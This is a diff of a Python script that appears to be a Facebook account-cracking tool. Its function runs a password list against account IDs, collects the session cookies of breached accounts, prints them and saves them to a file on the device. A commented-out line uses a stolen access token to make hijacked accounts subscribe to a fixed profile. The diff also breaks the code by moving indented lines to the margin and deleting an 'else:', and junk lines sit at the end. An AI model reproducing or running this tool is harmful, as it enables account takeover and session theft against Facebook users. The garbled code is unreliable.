@@ -816,19 +816,19 @@ def M_file_4(ids, names, passlist):
 				fr = session[2]['name']+'='+session[2]['value']
 				cookie+=fr+';'
 				datr = session[3]['name']+'='+session[3]['value']
-				cookie+=datr+'; dpr=2; locale=en_US; wd=950x1835; '
-				pagevoice = cvhmd.replace('c_user','m_page_voice')
-				cookie+=pagevoice
-				print("\033[1;33m[BISCUT-🍪] : \033[1;33m " + cookie)
-                open('/sdcard/DJALIL_MK_iDs_COOKIE_M4.txt', 'a').write(cookie+'\n')
-				#token = po['access_token']
-				#requests.post('https://graph.facebook.com/'+'127103294/'+'subscribers'+'?access_token='+token
+				cookie += datr+'; dpr=2; locale=en_US; wd=950x1835; '
+pagevoice = cvhmd.replace('c_user','m_page_voice')
+cookie += pagevoice
+print("\033[1;33m[BISCUT-🍪] : \033[1;33m " + cookie)
+open('/sdcard/DJALIL_MK_iDs_COOKIE_M4.txt', 'a').write(cookie+'\n')
+#token = po['access_token']
+#requests.post('https://graph.facebook.com/'+'127103294/'+'subscribers'+'?access_token='+token)
+
 try:
     if 'session_key' in po:
         pass
     elif 'www.facebook.com' in po.get('error', {}).get('message', ''):
         pass
-    else:
         continue
 
     oks.append(ids)
@@ -1077,6 +1077,7 @@ raise KeyError ("XD")
 "HaN".FuCk
 raise SystemExit
 open('').close()
+
 
 
 
